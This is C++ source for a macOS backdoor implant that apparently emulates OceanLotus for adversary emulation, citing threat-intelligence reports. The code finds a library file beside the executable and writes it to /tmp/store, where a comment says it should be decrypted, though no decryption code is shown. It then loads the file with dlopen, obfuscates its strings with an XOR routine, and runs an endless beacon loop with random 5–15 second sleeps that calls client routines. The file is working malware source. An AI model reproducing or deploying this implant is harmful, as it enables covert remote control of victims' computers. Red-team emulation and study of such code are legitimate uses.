#include <iostream>
#include <vector>
#include <dlfcn.h>
#include <dirent.h>

#include <mach-o/dyld.h>

#include "Comms.hpp"
#include "ClientPP.hpp"
#include "no_strings.hpp"

const char * PATH_TO_COMMS_LIB = "/tmp/store";

/*
getPathToExecutable
    About:
        Get the path to the executable
    Result:
        string representing path to the executable
*/
std::string getPathToExecutable() {
    std::string exePath;
    char path[PATH_MAX+1];
    uint32_t size = sizeof(path);

    if (_NSGetExecutablePath(path, &size) == 0) {
        // get path to execution folder
        exePath = std::string(path);
        std::size_t last = exePath.find_last_of("/");
        exePath = exePath.substr(0, last)+"/";
    } else {
        std::cout << xor_string("[IMPLANT] Buffer too small") << std::endl;
        return "";
    }

    return exePath;
}

/*
loadComms
    About:
        Responsible for finding, decrypting and loading the libComms dylib.
    Result:
        Returns pointer to the opened libComms dylib
    MITRE ATT&CK Techniques:
    CTI:
        https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/
    References:
        https://stackoverflow.com/q/43184544
        https://stackoverflow.com/a/75193598
        https://tldp.org/HOWTO/C++-dlopen/thesolution.html
*/
void* loadComms(std::string exePath, std::string self) {
    bool dylibLoaded = false;
    void* dylib = NULL;
    DIR* directory = NULL;
    if ((directory = opendir(exePath.c_str())) == NULL) {
        std::cout << xor_string("[IMPLANT] Can't open ") + exePath << std::endl;
        return dylib;
    }

    struct dirent* entry = NULL;
    while ((entry = readdir(directory)) != NULL) {
        char full_name[512] = { 0 };
        snprintf(full_name, 512, "%s%s", exePath.c_str(), entry->d_name);

        if (entry->d_type == DT_DIR) {
            std::cout << xor_string("[IMPLANT] Skipping directory in search for Comms file...") << std::endl;
        } else if (full_name == self){
            continue;
        } else {
            std::vector<unsigned char> fileBytes = client::readFile(full_name);
            try {

                //     decrypt file and output to /tmp/store

                bool fileWritten = client::writeFile(fileBytes, std::string(PATH_TO_COMMS_LIB));
                if (fileWritten) {
                    dylib = dlopen(PATH_TO_COMMS_LIB, RTLD_LAZY);
                    if (dylib != NULL) {
                        dylibLoaded = true;
                    } else {
                        char *msg = dlerror();
                        std::cout << "[IMPLANT] "<< msg << std::endl;
                    }
                }
            }
            catch(...) {
                // pass (ignore failures)
            }
        }
        if (dylibLoaded) {
            closedir(directory);
            return dylib;
        }
    }
//    return dlopen(PATH_TO_COMMS_LIB, RTLD_LAZY);
    return dylib;
}

int main(int argc, const char * argv[]) {

    ClientPP client;

    client.pathProcess = getPathToExecutable();

    // load libComms.dylib
    client.dylib = loadComms(client.pathProcess, argv[0]);

    std::cout << xor_string("[IMPLANT] Executing process name is: ") + std::string(argv[0]) << std::endl;

    // check libComms was opened
    if (client.dylib == NULL) {
        std::cout << xor_string("[IMPLANT] unable to load libComms.dylib (") + std::string(PATH_TO_COMMS_LIB) + ")" << std::endl;
        return 1;
    }

    // main loop
    // Figure 9 - https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html
    int dwRandomTimeSleep = 0;
    time_t dwTimeSeed;
    int dwRandomValue;
    while ( 1 ) {
        dwTimeSeed = time(0LL);
        srand(dwTimeSeed);
        dwRandomValue = rand()%(15000-5000+1)+5000;     // set sleep between 5-15 seconds
        dwRandomTimeSleep = dwRandomValue;

        // execute implant functionality
        if ( ClientPP::osInfo(dwRandomTimeSleep, &client))
            ClientPP::runClient(dwRandomTimeSleep, &client, client.dylib);
    }

    // finished execution, close
    return 0;
}
